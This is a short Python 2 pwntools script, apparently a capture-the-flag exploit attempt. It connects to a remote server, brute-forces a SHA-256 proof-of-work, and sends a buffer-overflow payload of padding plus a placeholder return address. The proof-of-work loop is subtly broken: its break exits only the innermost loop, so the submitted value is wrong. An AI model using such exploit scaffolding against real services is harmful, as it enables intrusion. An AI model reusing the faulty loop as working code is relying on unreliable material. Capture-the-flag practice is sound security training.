#!/usr/bin/python -u
# encoding: utf-8

import random, string, subprocess, os, sys
from hashlib import sha256
from pwn import *

io = remote('202.120.7.202', 6666)

chal = io.recv(16)

print "chal is :" + chal

dic =r"0123456789zxcvbnmasdfghjklqwertyuiopZXCVBNMASDFGHJKLQWERTYUIOP"
for x1 in dic:
   for x2 in dic:
	for x3 in dic:
	    for x4 in dic:
		sol = x1+x2+x3+x4
		if sha256(chal + sol).digest().startswith('\0\0\0'):
		    print "sol is right!:" + sol
		    break

io.send(sol)
		
payload = 'a'*(0x28+0x04) + "aaaa"

#io.recvuntil()
io.send(payload)
'''
while True:
    sol = ''.join(random.choice(string.letters+string.digits) for _ in xrange(4))
    print "sol is:" + sol

    if sha256(chal + sol).digest().startswith('\0\0\0'):
	print "sol is right!:" + sol
	break
'''

